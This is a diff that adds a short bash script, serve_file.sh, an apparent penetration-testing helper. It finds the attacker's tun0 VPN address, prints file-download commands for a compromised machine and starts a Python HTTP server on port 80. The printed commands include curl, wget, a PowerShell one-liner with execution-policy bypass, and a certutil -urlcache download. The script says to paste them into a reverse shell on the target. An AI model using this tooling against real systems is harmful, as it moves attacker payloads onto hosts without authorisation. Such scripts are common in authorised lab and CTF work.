@@ -1,0 +1,34 @@
+#!/bin/bash
+
+set -e
+
+if [ -z $1 ]; then
+    echo "Usage: ./serve_file.sh filename" && exit;
+else
+    filename=$1;
+fi
+
+ip=$(ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f 1)
+if [ -z $ip ]; then
+    echo "tun0 interface ip not found"
+    read -p "Enter IP: " ip
+fi
+
+echo ""
+echo "=== LINUX"
+echo "curl http://$ip/$filename -o $(basename $filename)"
+echo ""
+echo "wget http://$ip/$filename"
+echo ""
+
+echo "=== WINDOWS"
+echo "powershell -ep bypass -c \"\$wc=New-Object Net.WebClient;\$wc.DownloadFile('http://$ip/$filename','c:\\temp\\$(basename $filename)');\""
+echo ""
+echo "certutil -urlcache -f http://$ip/$filename $(basename $filename)"
+echo ""
+
+echo "-----------------------------------------------------"
+echo "Copy paste one of the command above to your reverse shell on the target to download files."
+
+python3 -m http.server 80
+
